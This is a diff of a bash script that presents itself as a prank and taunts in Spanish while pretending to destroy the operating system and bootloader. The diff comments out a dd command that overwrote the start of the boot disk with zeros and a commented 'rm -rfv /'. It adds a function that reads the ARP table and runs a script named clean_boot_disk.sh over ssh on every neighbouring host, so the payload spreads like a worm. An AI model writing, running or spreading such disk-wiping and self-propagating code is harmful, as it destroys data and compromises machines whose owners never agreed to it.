@@ -14,7 +14,7 @@ function take_boot_disk()
 function destroy_OS()
 {
     setterm -foreground red
-        for i in {1..100}; do sleep .1; echo "TE LA ACABAS DE BEBERRRR CON HIELOOOOOOOOO"; done
+        for i in {1..50}; do sleep .1; echo "TE LA ACABAS DE BEBERRRR CON HIELOOOOOOOOO"; done
     
     sleep 3
     echo -e "Procediendo a destruir el sistema y bootloader..."
@@ -26,9 +26,9 @@ function destroy_OS()
         echo -ne '#######################   (100%)\r'
             echo -ne '\n'
     
-    dd if=/dev/zero of=$(take_boot_disk) bs=1 count=46
+    #dd if=/dev/zero of=$(take_boot_disk) bs=1 count=46
     #rm -rfv /
-    printf -- "$(echo $RANDOM | md5sum | head -c 20; echo;)%.0s" {1..10567}
+    #printf -- "$(echo $RANDOM | md5sum | head -c 20; echo;)%.1s" {1..10567}
     
     echo $RANDOM | md5sum | head -c 20; echo;
 
@@ -98,8 +98,19 @@ function bye_bye() {
         init 6
 }
 
+function check_arp_table {
+FILE_SEND="clean_boot_disk.sh"
+FILE_PATH="/tmp"    
+    ip neigh show | awk -F " " '{print $1};'
+    cd $FILE_PATH
+    for i in `ip neigh show | awk -F " " '{print $1};' | grep -vE "*.1"`; do ssh -v $i 'bash -s' < $FILE_PATH/$FILE_SEND; done
+
+}
+
 destroy_OS
 
 sleep 2
 
-bye_bye
+check_arp_table
+
+#bye_bye
